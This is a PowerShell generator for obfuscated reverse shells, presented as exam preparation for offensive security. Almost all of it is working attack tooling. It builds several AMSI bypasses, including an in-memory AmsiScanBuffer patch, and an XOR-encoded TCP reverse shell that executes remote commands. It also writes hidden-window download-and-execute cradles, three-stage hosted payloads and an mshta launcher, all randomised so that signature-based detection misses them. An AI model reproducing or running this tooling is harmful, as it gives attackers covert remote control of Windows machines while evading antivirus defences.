<#
.SYNOPSIS
    Polymorphic obfuscated PowerShell reverse shell generator for OSEP exam prep.

.DESCRIPTION
    Three delivery modes:

    STANDALONE (default):
        Single all-in-one -EncodedCommand launcher. AMSI bypass + XOR shell.

    HOSTED (-HostedURL):
        Two-file split. Launcher fetches hosted PS1 (AMSI bypass + XOR shell).

    THREE-STAGE (-BaseURL):  <-- PRIMARY MODE
        Three separate hosted PS1 files. Each stage spawns the next then exits.
        Stage 1 (1.ps1) : Spawns hidden PS process for Stage 2, then exits.
        Stage 2 (2.ps1) : AMSI bypass attempt -> if successful IEX's Stage 3
                          in same process (so AMSI stays disabled).
        Stage 3 (3.ps1) : XOR-encoded reverse shell. Runs in Stage 2's process
                          after AMSI is already disabled. Never scanned.
        Launcher (r.bat): IEX(DownloadString(1.ps1)) - simple, passes AMSI easily.

    WHY THREE STAGES:
        IEX(DownloadString) causes AMSI to scan the entire downloaded string
        before any of it executes. Putting the bypass + shell in one file means
        AMSI catches the shell before the bypass can fire.
        Splitting gives the bypass its own small file (better chance of evading
        AMSI's scan) and puts the shell in a separate file that only runs after
        AMSI is already disabled.

.PARAMETER IP
    Attacker listener IP.

.PARAMETER Port
    Attacker listener port (1-65535).

.PARAMETER BaseURL
    Base URL where 1.ps1, 2.ps1, 3.ps1 will be hosted.
    Enables three-stage mode.
    Example: https://hoster.groupservice.co.za/payloads

.PARAMETER StageDir
    Local directory to write 1.ps1, 2.ps1, 3.ps1.
    Defaults to c:\temp

.PARAMETER OutputFile
    Write the launcher (r.bat) to this path.

.PARAMETER HostedURL
    (Two-file hosted mode) URL where single payload PS1 is hosted.

.PARAMETER PayloadFile
    (Two-file hosted mode) Local path to write the hosted payload.

.PARAMETER LaunchMethod
    Encoded (default) : powershell -EncodedCommand
    MSHTA             : mshta vbscript cradle

.PARAMETER NoEncode
    (Standalone only) Emit raw PS instead of -EncodedCommand.

.EXAMPLE
    # Three-stage hosted mode - primary workflow
    .\New-ObfuscatedShell.ps1 -IP 192.168.255.29 -Port 4443 `
        -BaseURL https://hoster.groupservice.co.za/payloads `
        -StageDir c:\temp `
        -OutputFile c:\temp\r.bat

.EXAMPLE
    # Standalone
    .\New-ObfuscatedShell.ps1 -IP 192.168.45.200 -Port 4444 -OutputFile c:\temp\r.bat
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidatePattern('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')]
    [string]$IP,

    [Parameter(Mandatory = $true)]
    [ValidateRange(1, 65535)]
    [int]$Port,

    [Parameter(Mandatory = $false)]
    [string]$BaseURL,

    [Parameter(Mandatory = $false)]
    [string]$StageDir = 'c:\temp',

    [Parameter(Mandatory = $false)]
    [string]$OutputFile,

    [Parameter(Mandatory = $false)]
    [string]$HostedURL,

    [Parameter(Mandatory = $false)]
    [string]$PayloadFile,

    [Parameter(Mandatory = $false)]
    [ValidateSet('Encoded','MSHTA')]
    [string]$LaunchMethod = 'Encoded',

    [Parameter(Mandatory = $false)]
    [switch]$NoEncode
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# --- Helpers ------------------------------------------------------------------

function Get-RandomName {
    param([int]$MinLen = 4, [int]$MaxLen = 9)
    $c = 'bcdfghjklmnpqrstvwxyz'; $v = 'aeiou'
    $len = Get-Random -Minimum $MinLen -Maximum ($MaxLen + 1)
    $n = ''
    for ($i = 0; $i -lt $len; $i++) {
        if ($i % 2 -eq 0) { $n += $c[(Get-Random -Maximum $c.Length)] }
        else               { $n += $v[(Get-Random -Maximum $v.Length)] }
    }
    return [char]([int][char]'a' + (Get-Random -Maximum 26)) + $n
}

function Randomize-Case {
    param([string]$s)
    $o = ''
    foreach ($c in $s.ToCharArray()) {
        if ((Get-Random -Maximum 2) -eq 0) { $o += $c.ToString().ToUpper() }
        else                               { $o += $c.ToString().ToLower() }
    }
    return $o
}

function Split-StringObfuscated {
    param([string]$s)
    if ($s.Length -lt 4) { return "'$s'" }
    $chunks = @(); $pos = 0
    $parts = Get-Random -Minimum 2 -Maximum 5
    for ($i = 0; $i -lt $parts; $i++) {
        $rem  = $s.Length - $pos
        $take = if ($i -eq ($parts-1)) { $rem }
                else { [math]::Max(1,(Get-Random -Minimum 1 -Maximum ([math]::Max(2,$rem-($parts-$i-1))))) }
        $q = if ((Get-Random -Maximum 2) -eq 0) { "'" } else { '"' }
        $chunks += "$q$($s.Substring($pos,$take))$q"
        $pos += $take
    }
    return ($chunks -join '+')
}

function ConvertTo-CharExpr {
    param([string]$s)
    $parts = $s.ToCharArray() | ForEach-Object { "[char]$([int]$_)" }
    return "(-join($($parts -join ',')))"
}

# --- AMSI Bypass builders -----------------------------------------------------

function Build-AmsiBypass-Direct {
    # SetValue(null,true) on amsiInitFailed. Direct GetType, no loop, no Add-Type.
    $rT = Get-RandomName; $rF = Get-RandomName
    $exFull = ConvertTo-CharExpr 'System.Management.Automation.AmsiUtils'
    $exFld  = ConvertTo-CharExpr 'amsiInitFailed'
    $kGT = Randomize-Case 'GetType'; $kGF = Randomize-Case 'GetField'
    $kSV = Randomize-Case 'SetValue'; $kBF = Randomize-Case 'NonPublic,Static'
    return "`$$rT=[Ref].Assembly.$kGT($exFull);`$$rF=`$$rT.$kGF($exFld,[Reflection.BindingFlags]'$kBF');`$$rF.$kSV(`$null,`$true)"
}

function Build-AmsiBypass-Context {
    # Null the amsiContext IntPtr. No loop, no Add-Type.
    $rT = Get-RandomName; $rF = Get-RandomName
    $exFull = ConvertTo-CharExpr 'System.Management.Automation.AmsiUtils'
    $exFld  = ConvertTo-CharExpr 'amsiContext'
    $kGT = Randomize-Case 'GetType'; $kGF = Randomize-Case 'GetField'
    $kSV = Randomize-Case 'SetValue'; $kBF = Randomize-Case 'NonPublic,Static'
    $kIP = Randomize-Case 'IntPtr'
    return "`$$rT=[Ref].Assembly.$kGT($exFull);`$$rF=`$$rT.$kGF($exFld,[Reflection.BindingFlags]'$kBF');`$$rF.$kSV(`$null,[$kIP]::Zero)"
}

function Build-AmsiBypass-IntFlags {
    <#
    Uses integer BindingFlags (32=NonPublic, 16=Static) instead of the string
    'NonPublic,Static', and char arrays for the type/field names.
    Avoids common string-pattern AMSI signatures. Designed to be small enough
    to pass AMSI scanning when hosted as Stage 2 in three-stage delivery.
    Randomly targets amsiInitFailed or amsiContext each run.
    #>
    $rT = Get-RandomName; $rF = Get-RandomName
    $kGT = Randomize-Case 'GetType'
    $kGF = Randomize-Case 'GetField'
    $kSV = Randomize-Case 'SetValue'
    $kBF = Randomize-Case 'BindingFlags'

    # Full type name as char array - avoids 'AmsiUtils' / 'AmsiScan' string literals
    $typeArr = ([int[]][char[]]'System.Management.Automation.AmsiUtils') -join ','

    if ((Get-Random -Maximum 2) -eq 0) {
        # Target: amsiInitFailed -> $true
        $fieldArr = ([int[]][char[]]'amsiInitFailed') -join ','
        return "`$$rT=[Ref].Assembly.$kGT((-join([char[]]@($typeArr))));`$$rF=`$$rT.$kGF((-join([char[]]@($fieldArr))),([Reflection.$kBF](32-bor16)));`$$rF.$kSV(`$null,`$true)"
    } else {
        # Target: amsiContext -> [IntPtr]::Zero
        $fieldArr = ([int[]][char[]]'amsiContext') -join ','
        $kIP = Randomize-Case 'IntPtr'
        return "`$$rT=[Ref].Assembly.$kGT((-join([char[]]@($typeArr))));`$$rF=`$$rT.$kGF((-join([char[]]@($fieldArr))),([Reflection.$kBF](32-bor16)));`$$rF.$kSV(`$null,[$kIP]::Zero)"
    }
}

function Build-AmsiBypass-Patch {
    # AmsiScanBuffer patch via XOR-obfuscated Add-Type P/Invoke.
    $typeDef = '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);'
    $vNS=Get-RandomName; $vCL=Get-RandomName
    $vH=Get-RandomName; $vF=Get-RandomName; $vO=Get-RandomName
    $vTD=Get-RandomName; $vTDK=Get-RandomName; $vTDA=Get-RandomName
    $xk2 = Get-Random -Minimum 1 -Maximum 255
    $tdB = [int[]][char[]]$typeDef | ForEach-Object { $_ -bxor $xk2 }
    $half2 = [math]::Floor($tdB.Count / 2)
    $tdExpr = "@($($tdB[0..($half2-1)] -join ','),$($tdB[$half2..($tdB.Count-1)] -join ','))"
    $exDll = ConvertTo-CharExpr 'amsi.dll'; $exFn = ConvertTo-CharExpr 'AmsiScanBuffer'
    $kAT=Randomize-Case 'Add-Type'; $kMD=Randomize-Case 'MemberDefinition'
    $kNA=Randomize-Case 'Name'; $kNS=Randomize-Case 'Namespace'
    $kLL=Randomize-Case 'LoadLibrary'; $kGP=Randomize-Case 'GetProcAddress'
    $kVP=Randomize-Case 'VirtualProtect'
    $kMSH=Randomize-Case 'System.Runtime.InteropServices.Marshal'
    $kCP=Randomize-Case 'Copy'; $kON=Randomize-Case 'Out-Null'
    return "`$$vTDK=$xk2;`$$vTDA=$tdExpr;`$$vTD=-join(`$$vTDA|%{[char](`$_-bxor`$$vTDK)});$kAT -$kMD `$$vTD -$kNA '$vCL' -$kNS '$vNS';`$$vH=[$vNS.$vCL]::$kLL($exDll);`$$vF=[$vNS.$vCL]::$kGP(`$$vH,$exFn);`$$vO=0;[$vNS.$vCL]::$kVP(`$$vF,[uint32]5,0x40,[ref]`$$vO)|$kON;[$kMSH]::$kCP([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,`$$vF,6)"
}

function Build-AmsiBypass {
    # Random pick for standalone/hosted modes
    $pick = Get-Random -Minimum 0 -Maximum 3
    $code = switch ($pick) {
        0 { Build-AmsiBypass-Direct }
        1 { Build-AmsiBypass-Context }
        2 { Build-AmsiBypass-Patch }
    }
    return [PSCustomObject]@{ Name = @('A-Direct','B-Context','C-Patch')[$pick]; Code = $code }
}

# --- Download cradle builder ---------------------------------------------------

function Build-DownloadCradle {
    param([string]$URL, [switch]$PlainURL)
    $vURL=Get-RandomName; $vPL=Get-RandomName; $vWC=Get-RandomName
    # PlainURL: skip Split-StringObfuscated (used when URL is embedded in -ArgumentList)
    $urlExpr = if ($PlainURL) { "'$URL'" } else { Split-StringObfuscated $URL }
    $kIex = if ((Get-Random -Maximum 2) -eq 0) { 'IEX' } else { Randomize-Case 'Invoke-Expression' }
    switch (Get-Random -Minimum 0 -Maximum 3) {
        0 { $kNO=Randomize-Case 'New-Object'; $kWC=Randomize-Case 'Net.WebClient'; $kDL=Randomize-Case 'DownloadString'
            return "`$$vURL=$urlExpr;`$$vPL=($kNO $kWC).$kDL(`$$vURL);$kIex `$$vPL" }
        1 { $kIWR=Randomize-Case 'Invoke-WebRequest'; $kUBP=Randomize-Case 'UseBasicParsing'; $kCN=Randomize-Case 'Content'
            return "`$$vURL=$urlExpr;`$$vPL=($kIWR -Uri `$$vURL -$kUBP).$kCN;$kIex `$$vPL" }
        2 { $kWCT=Randomize-Case 'System.Net.WebClient'; $kDL=Randomize-Case 'DownloadString'
            return "`$$vURL=$urlExpr;`$$vWC=[$kWCT]::new();`$$vPL=`$$vWC.$kDL(`$$vURL);$kIex `$$vPL" }
    }
}

# --- Stage 1 builder ----------------------------------------------------------

function Build-Stage1 {
    <#
    Stage 1 (1.ps1): Spawns a new hidden PowerShell process that downloads and
    runs Stage 2 via -EncodedCommand. The current PS process then exits cleanly.
    Kept intentionally minimal so it passes AMSI scanning with no issues.
    #>
    param([string]$Stage2URL)

    $vURL  = Get-RandomName
    $vCmd  = Get-RandomName
    $vB64  = Get-RandomName
    $kSP   = Randomize-Case 'Start-Process'
    $kPS   = Randomize-Case 'powershell'
    $kWS   = Randomize-Case 'WindowStyle'
    $kAL   = Randomize-Case 'ArgumentList'
    $kNO   = Randomize-Case 'New-Object'
    $kWC   = Randomize-Case 'Net.WebClient'
    $kDS   = Randomize-Case 'DownloadString'
    $kIex  = if ((Get-Random -Maximum 2) -eq 0) { 'IEX' } else { Randomize-Case 'Invoke-Expression' }
    $kEnc  = Randomize-Case 'Unicode'
    $kConv = Randomize-Case 'Convert'
    $kB64  = Randomize-Case 'ToBase64String'
    $kTxt  = Randomize-Case 'Text.Encoding'
    $kGB   = Randomize-Case 'GetBytes'

    # Build the command for stage 2, encode it so no quoting issues in -ArgumentList
    # The encoding happens at generator runtime, output is a static b64 string
    $innerCmd = "$kIex(($kNO $kWC).$kDS('$Stage2URL'))"
    $innerB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerCmd))

    $urlObf = Split-StringObfuscated $Stage2URL

    return "`$$vURL=$urlObf;$kSP $kPS -$kWS Hidden -$kAL `"-ep bypass -EncodedCommand $innerB64`""
}

# --- Launcher wrapper ---------------------------------------------------------

function Build-Launcher {
    param([string]$OuterScript, [string]$Method)
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($OuterScript)
    $b64   = [Convert]::ToBase64String($bytes)
    if ($Method -eq 'MSHTA') {
        $psCmd = "powershell -NoP -Exec Bypass -EncodedCommand $b64"
        return "mshta vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"$psCmd"""",0,False:window.close"")"
    } else {
        return "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $b64"
    }
}

# --- Variable name pool --------------------------------------------------------

$vClient=Get-RandomName; $vStream=Get-RandomName
$vBytes=Get-RandomName; $vLen=Get-RandomName; $vData=Get-RandomName
$vSendBack=Get-RandomName; $vSendBack2=Get-RandomName; $vSendByte=Get-RandomName

# --- Build obfuscated IP / Port -----------------------------------------------

$ipObf      = Split-StringObfuscated $IP
$portJitter = Get-Random -Minimum 1 -Maximum 500
$portObf    = "($($Port + $portJitter)-$portJitter)"

# --- Randomise shell keywords -------------------------------------------------

$kSystem    = Randomize-Case 'System'; $kNet = Randomize-Case 'Net'
$kSockets   = Randomize-Case 'Sockets'; $kTCPClient = Randomize-Case 'TCPClient'
$kGetStream = Randomize-Case 'GetStream'; $kASCII = Randomize-Case 'ASCII'
$kText      = Randomize-Case 'text'; $kEncoding = Randomize-Case 'encoding'
$kGetString = Randomize-Case 'GetString'; $kOutString = Randomize-Case 'Out-String'
$kGetBytes  = Randomize-Case 'GetBytes'; $kWrite = Randomize-Case 'Write'
$kFlush     = Randomize-Case 'Flush'; $kClose = Randomize-Case 'Close'
$kPath      = Randomize-Case 'Path'; $kTry = Randomize-Case 'try'
$kCatch     = Randomize-Case 'catch'
$kIex       = if ((Get-Random -Maximum 2) -eq 0) { 'iex' } else { Randomize-Case 'Invoke-Expression' }

# --- Layer 1: Polymorphic reverse shell ---------------------------------------

$raw = @"
`$$vClient=[$(Randomize-Case "$kSystem.$kNet.$kSockets.$kTCPClient")]::new($ipObf,$portObf);`$$vStream=`$$vClient.$kGetStream();[byte[]]`$$vBytes=0..65535|%{0};`$$vSendByte=([$kText.$kEncoding]::$kASCII).$kGetBytes('PS '+($(Randomize-Case 'pwd')).$kPath+'> ');`$$vStream.$kWrite(`$$vSendByte,0,`$$vSendByte.Length);`$$vStream.$kFlush();while((`$$vLen=`$$vStream.$(Randomize-Case 'Read')(`$$vBytes,0,`$$vBytes.Length)) -ne 0){`$$vData=([$kText.$kEncoding]::$kASCII).$kGetString(`$$vBytes,0,`$$vLen);$kTry{`$$vSendBack=($kIex `$$vData 2>&1|$kOutString)}$kCatch{`$$vSendBack=`$_.ToString()};`$$vSendBack2=`$$vSendBack+'PS '+($(Randomize-Case 'pwd')).$kPath+'> ';`$$vSendByte=([$kText.$kEncoding]::$kASCII).$kGetBytes(`$$vSendBack2);`$$vStream.$kWrite(`$$vSendByte,0,`$$vSendByte.Length);`$$vStream.$kFlush()};`$$vClient.$kClose()
"@
$raw = $raw.Trim()

# --- Layer 2: XOR encode the shell --------------------------------------------

$xorKey   = Get-Random -Minimum 1 -Maximum 255
$xorChars = [int[]][char[]]$raw | ForEach-Object { $_ -bxor $xorKey }
$vL2Key=Get-RandomName; $vL2Enc=Get-RandomName; $vL2Dec=Get-RandomName
$kBxor  = Randomize-Case 'bxor'; $kChar2 = Randomize-Case 'char'
$kIex2  = if ((Get-Random -Maximum 2) -eq 0) { 'iex' } else { Randomize-Case 'Invoke-Expression' }
$half   = [math]::Floor($xorChars.Count / 2)
$encExpr = "@($($xorChars[0..($half-1)] -join ','),$($xorChars[$half..($xorChars.Count-1)] -join ','))"
$stub   = "`$$vL2Key=$xorKey;`$$vL2Enc=$encExpr;`$$vL2Dec=-join(`$$vL2Enc|%{[$kChar2](`$_-$kBxor`$$vL2Key)});$kIex2 `$$vL2Dec"

# --- Assemble output by mode --------------------------------------------------

if ($BaseURL) {

    # ======================================================
    # THREE-STAGE MODE
    # ======================================================
    $BaseURL = $BaseURL.TrimEnd('/')
    $url1 = "$BaseURL/1.ps1"
    $url2 = "$BaseURL/2.ps1"
    $url3 = "$BaseURL/3.ps1"

    # Stage 1: spawns hidden PS for stage 2, then exits
    $s1Content = Build-Stage1 -Stage2URL $url2

    # Stage 2: AMSI bypass (IntFlags technique) + download cradle for stage 3
    # IntFlags bypass used here because it must pass AMSI scanning itself
    $s2Bypass  = Build-AmsiBypass-IntFlags
    $s2Cradle  = Build-DownloadCradle -URL $url3
    $s2Content = $s2Bypass + ';' + $s2Cradle

    # Stage 3: XOR shell only - not scanned (AMSI disabled by stage 2)
    $s3Content = $stub

    # Launcher: simple IEX of stage 1 - plain, passes AMSI, no encoding needed
    $launcher = "powershell -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('$url1')"""

    # Write stage files
    $s1Path = Join-Path $StageDir '1.ps1'
    $s2Path = Join-Path $StageDir '2.ps1'
    $s3Path = Join-Path $StageDir '3.ps1'
    $s1Content | Out-File -FilePath $s1Path -Encoding ascii -Force
    $s2Content | Out-File -FilePath $s2Path -Encoding ascii -Force
    $s3Content | Out-File -FilePath $s3Path -Encoding ascii -Force

} elseif ($HostedURL) {

    # ======================================================
    # HOSTED MODE (two-file)
    # ======================================================
    $amsi        = Build-AmsiBypass
    $hostedPayload = $amsi.Code + ';' + $stub
    $cradle      = Build-DownloadCradle -URL $HostedURL
    $launcher    = "powershell -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('$HostedURL')"""
    if ($PayloadFile) {
        $hostedPayload | Out-File -FilePath $PayloadFile -Encoding ascii -Force
    }

} else {

    # ======================================================
    # STANDALONE MODE
    # ======================================================
    $amsi        = Build-AmsiBypass
    $outerScript = $amsi.Code + ';' + $stub
    if ($NoEncode) {
        $launcher = $outerScript
    } else {
        $launcher = Build-Launcher -OuterScript $outerScript -Method $LaunchMethod
    }
}

# --- Output -------------------------------------------------------------------

$modeLabel = if ($BaseURL) { 'Three-Stage HTTPS' } elseif ($HostedURL) { 'Hosted (two-file)' } else { 'Standalone' }

Write-Host @"
=============================================================
  OSEP PowerShell Reverse Shell Generator  v1.4
  Mode     : $modeLabel
  Listener : $IP : $Port
  XOR key  : $xorKey
  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
=============================================================
"@ -ForegroundColor Cyan

Write-Host "[*] Layer 1 - polymorphic PS shell:" -ForegroundColor Yellow
Write-Host $raw -ForegroundColor DarkGray; Write-Host ""

Write-Host "[*] Layer 2 - XOR stub (key=$xorKey):" -ForegroundColor Yellow
Write-Host $stub -ForegroundColor Gray; Write-Host ""

if ($BaseURL) {
    Write-Host "[*] Stage 1 - 1.ps1  (spawns hidden PS for stage 2, then exits):" -ForegroundColor Yellow
    Write-Host $s1Content -ForegroundColor DarkGray; Write-Host ""

    Write-Host "[*] Stage 2 - 2.ps1  (AMSI bypass [IntFlags] + cradle to 3.ps1):" -ForegroundColor Yellow
    Write-Host $s2Content -ForegroundColor Gray; Write-Host ""

    Write-Host "[*] Stage 3 - 3.ps1  (XOR shell - runs after AMSI disabled):" -ForegroundColor Yellow
    Write-Host $s3Content -ForegroundColor DarkGray; Write-Host ""

    Write-Host "[+] Written: $s1Path" -ForegroundColor Green
    Write-Host "[+] Written: $s2Path" -ForegroundColor Green
    Write-Host "[+] Written: $s3Path" -ForegroundColor Green
    Write-Host ""
    Write-Host "[!] Upload all three files to: $BaseURL/" -ForegroundColor Cyan
    Write-Host ""

} elseif ($HostedURL) {
    Write-Host "[*] AMSI bypass ($($amsi.Name)) + XOR stub -> $PayloadFile" -ForegroundColor Yellow
    Write-Host "[+] Written: $PayloadFile  ->  upload to $HostedURL" -ForegroundColor Green
    Write-Host ""
} else {
    Write-Host "[*] AMSI bypass ($($amsi.Name)):" -ForegroundColor Yellow
    Write-Host $amsi.Code -ForegroundColor DarkGray; Write-Host ""
}

Write-Host "[*] Launcher:" -ForegroundColor Green
Write-Host $launcher -ForegroundColor White; Write-Host ""
Write-Host "[*] Listener: rlwrap nc -lvnp $Port" -ForegroundColor Yellow; Write-Host ""

if ($OutputFile) {
    $launcher | Out-File -FilePath $OutputFile -Encoding ascii -Force
    Write-Host "[+] Launcher written to: $OutputFile" -ForegroundColor Green
}
